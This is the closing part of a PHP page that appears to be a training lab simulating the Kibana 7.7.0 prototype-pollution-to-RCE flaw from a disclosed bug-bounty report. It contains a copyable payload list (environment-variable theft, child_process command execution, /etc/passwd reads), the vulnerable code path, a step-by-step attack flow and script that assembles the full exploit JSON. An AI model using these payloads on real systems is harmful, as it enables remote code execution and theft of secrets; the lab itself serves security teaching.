                  'warn' => '  ',
                  'ok'   => '  ✓ ',
                  default => '  ',
              };
              ?>
              <div class="<?= esc($cls) ?>"><?= esc($pref . $t['msg']) ?></div>
              <?php endforeach; ?>

              <?php if ($rce_fired && $rce_result): ?>
              <div class="log-rce" style="margin-top:6px;">  ⚡ RCE EXECUTED — Node.js runtime code output captured:</div>
              <?php endif; ?>
            </div>

            <?php if ($rce_fired && $rce_result): ?>
            <div class="rce-output-box">
              <div class="rce-output-label">
                <?php
                echo match($rce_result['type']) {
                    'exec'     => '▶ child_process.' . esc($rce_result['method']) . '("' . esc($rce_result['cmd']) . '") output',
                    'env'      => '▶ process.env.' . esc($rce_result['var']),
                    'readfile' => '▶ fs.readFileSync("' . esc($rce_result['file']) . '")',
                    'expr'     => '▶ expression result',
                    'log'      => '▶ console.log()',
                    default    => '▶ execution output',
                };
                ?>
              </div><?= esc($rce_result['output']) ?></div>
            <?php endif; ?>

            <?php elseif ($last_log_row): ?>
            <div style="font-size:.76rem;color:#5D7898;padding:8px 0;">
              Previous execution at <?= esc($last_log_row['fired_at']) ?> —
              <?php if ($last_log_row['proto_key']): ?>
              <span style="color:#F5A700;">Proto pollution: <?= esc($last_log_row['proto_key']) ?></span> ·
              <span style="color:#CF9FFF;"><?= mb_substr(esc($last_log_row['rce_output'] ?? ''), 0, 100) ?>...</span>
              <?php else: ?>
              <span style="color:#00BFB3;">Clean — no signals</span>
              <?php endif; ?>
            </div>
            <?php endif; ?>
          </div>
        </div>
        <?php endif; ?>

      </div><!-- /left column -->

      <!-- Right column: payload reference -->
      <div>
        <div class="k-card">
          <div class="k-card-hd">
            <div class="k-card-title">
              <svg viewBox="0 0 24 24" style="color:#F5A700;"><path d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l-.707-.707m2.828 9.9a5 5 0 117.072 0l-.548.547A3.374 3.374 0 0014 18.469V19a2 2 0 11-4 0v-.531c0-.895-.356-1.754-.988-2.386l-.548-.547z"/></svg>
              Payload Reference
            </div>
          </div>
          <div class="k-card-body">
            <div class="payload-ref">
              <div class="payload-ref-title">influencer_field_name injection payloads</div>

              <div class="payload-item">
                <div class="payload-item-lbl">① Detection — arithmetic check</div>
                <div class="payload-code" onclick="copyPayload(this)" title="Click to use">
<span class="hi-proto">"foo.__proto__.sourceURL"</span>: <span class="hi-val">"\u2028\u2029\n;console.log('pwned')"</span>
                </div>
              </div>

              <div class="payload-item">
                <div class="payload-item-lbl">② Read Node.js version</div>
                <div class="payload-code" onclick="copyPayload(this)" title="Click to use">
<span class="hi-proto">"foo.__proto__.sourceURL"</span>: <span class="hi-val">"\u2028\u2029\n;process.version"</span>
                </div>
              </div>

              <div class="payload-item">
                <div class="payload-item-lbl">③ Env var exfil — FLAG</div>
                <div class="payload-code" onclick="copyPayload(this)" title="Click to use">
<span class="hi-proto">"foo.__proto__.sourceURL"</span>: <span class="hi-val">"\u2028\u2029\n;process.env.FLAG"</span>
                </div>
              </div>

              <div class="payload-item">
                <div class="payload-item-lbl">④ RCE — exec command (from report)</div>
                <div class="payload-code" onclick="copyPayload(this)" title="Click to use">
<span class="hi-proto">"foo.__proto__.sourceURL"</span>: <span class="hi-val">"\u2028\u2029\n;global.process.mainModule.require('child_process').exec('id')"</span>
                </div>
              </div>

              <div class="payload-item">
                <div class="payload-item-lbl">⑤ File read — /etc/passwd</div>
                <div class="payload-code" onclick="copyPayload(this)" title="Click to use">
<span class="hi-proto">"foo.__proto__.sourceURL"</span>: <span class="hi-val">"\u2028\u2029\n;require('fs').readFileSync('/etc/passwd','utf8')"</span>
                </div>
              </div>
            </div>

            <div style="margin-top:12px;background:#030D1A;border:1px solid #1C3050;border-radius:4px;padding:10px;font-family:'Courier New',monospace;font-size:.7rem;color:#5D7898;">
              <div style="color:#2E4A6A;margin-bottom:4px;">// vulnerable code path</div>
              <div style="color:#A8CC88;">// bulk_create_ml_signals.ts#L58</div>
              <div style="margin-top:4px;">influencers.<span style="color:#6BA4D6;">forEach</span>(inf => {</div>
              <div style="padding-left:12px;">const nested = {};</div>
              <div style="padding-left:12px;"><span style="color:#F87171;">// BUG: field_name used as key path</span></div>
              <div style="padding-left:12px;">set(nested, inf.<span style="color:#F5A700;">influencer_field_name</span>, ...</div>
              <div style="padding-left:12px;">merge(signalSource, nested); <span style="color:#F87171;">// ← __proto__ traversal</span></div>
              <div>});</div>
            </div>
          </div>
        </div>

        <!-- Attack flow card -->
        <div class="k-card">
          <div class="k-card-hd">
            <div class="k-card-title">
              <svg viewBox="0 0 24 24" style="color:#0077CC;"><path d="M3 3h18v18H3zM3 9h18M9 21V9"/></svg>
              Attack Flow
            </div>
          </div>
          <div class="k-card-body" style="font-size:.76rem;line-height:2;">
            <div style="display:flex;gap:8px;align-items:baseline;margin-bottom:6px;">
              <span style="background:#0077CC;color:#fff;padding:1px 6px;border-radius:10px;font-size:.65rem;font-weight:900;flex-shrink:0;">1</span>
              <span style="color:#DFE5EF;">Ensure rule is <strong>enabled</strong></span>
            </div>
            <div style="display:flex;gap:8px;align-items:baseline;margin-bottom:6px;">
              <span style="background:#0077CC;color:#fff;padding:1px 6px;border-radius:10px;font-size:.65rem;font-weight:900;flex-shrink:0;">2</span>
              <span style="color:#DFE5EF;">Set <code style="color:#F87171;">influencer_field_name</code> = <code style="color:#F5A700;">foo.__proto__.sourceURL</code></span>
            </div>
            <div style="display:flex;gap:8px;align-items:baseline;margin-bottom:6px;">
              <span style="background:#0077CC;color:#fff;padding:1px 6px;border-radius:10px;font-size:.65rem;font-weight:900;flex-shrink:0;">3</span>
              <span style="color:#DFE5EF;">Set <code style="color:#F87171;">influencer_field_values</code> = <code style="color:#A8CC88;">\u2028\u2029\n;[code]</code></span>
            </div>
            <div style="display:flex;gap:8px;align-items:baseline;margin-bottom:6px;">
              <span style="background:#0077CC;color:#fff;padding:1px 6px;border-radius:10px;font-size:.65rem;font-weight:900;flex-shrink:0;">4</span>
              <span style="color:#DFE5EF;">Click <strong>Send Request</strong> — rule fires in ~15s</span>
            </div>
            <div style="display:flex;gap:8px;align-items:baseline;">
              <span style="background:#6B2FA0;color:#fff;padding:1px 6px;border-radius:10px;font-size:.65rem;font-weight:900;flex-shrink:0;">✓</span>
              <span style="color:#CF9FFF;">RCE output appears in Signals log</span>
            </div>
          </div>
        </div>
      </div><!-- /right column -->

    </div><!-- /2col -->

    <!-- Report metadata -->
    <div class="report-panel">
      <div style="font-size:.6rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#2E4A6A;margin-bottom:10px;">HackerOne Report Metadata</div>
      <div class="report-grid">
        <div><div class="ri-lbl">Report</div><div class="ri-val"><a href="https://hackerone.com/reports/861744" target="_blank" rel="noopener">#861744</a></div></div>
        <div><div class="ri-lbl">Researcher</div><div class="ri-val">alexbrasetvik</div></div>
        <div><div class="ri-lbl">Program</div><div class="ri-val">Elastic</div></div>
        <div><div class="ri-lbl">Severity</div><div class="ri-val"><span class="sev-badge">Critical (9–10)</span></div></div>
        <div><div class="ri-lbl">Weakness</div><div class="ri-val">Prototype Pollution → RCE</div></div>
        <div><div class="ri-lbl">Bounty</div><div class="ri-val">$5,000</div></div>
        <div><div class="ri-lbl">Reported</div><div class="ri-val">Apr 28, 2020</div></div>
        <div><div class="ri-lbl">Disclosed</div><div class="ri-val">Apr 19, 2021</div></div>
        <div><div class="ri-lbl">Affected file</div><div class="ri-val"><code style="font-size:.68rem;color:#A8CC88;">bulk_create_ml_signals.ts#L58</code></div></div>
      </div>
    </div>

  </main>
</div>

<footer>
  <span>Kibana 7.7.0 · Elasticsearch · X-Pack Security · Lab simulation based on <a href="https://hackerone.com/reports/861744" target="_blank" rel="noopener">HackerOne #861744</a></span>
  <span>© 2020 Elastic N.V.</span>
</footer>

<script>
function copyPayload(el) {
    // Build the full anomaly JSON with this payload
    var text = el.textContent || el.innerText;
    // Extract field_name and field_values from the display
    var fnMatch = text.match(/"(foo\.__proto__\.sourceURL)"/);
    var fvMatch = text.match(/:\s*"(\\u2028\\u2029.*?)"\s*$/s);
    if (!fnMatch || !fvMatch) return;

    var doc = {
        "timestamp": 1588093630045,
        "result_type": "record",
        "record_score": 1,
        "job_id": "linux_anomalous_network_activity_ecs",
        "by_field_name": "process.name",
        "by_field_value": "exploit",
        "influencers": [
            {
                "influencer_field_name": fnMatch[1],
                "influencer_field_values": fvMatch[1].replace(/\\u2028/g, '\u2028').replace(/\\u2029/g, '\u2029').replace(/\\n/g, '\n').replace(/\\;/g, ';')
            }
        ]
    };

    var ta = document.querySelector('.json-editor');
    if (ta) {
        ta.value = JSON.stringify(doc, null, 2);
        ta.style.borderColor = '#0077CC';
        setTimeout(function(){ ta.style.borderColor = '#1C3050'; }, 1500);
    }
}
</script>
</body>
</html>
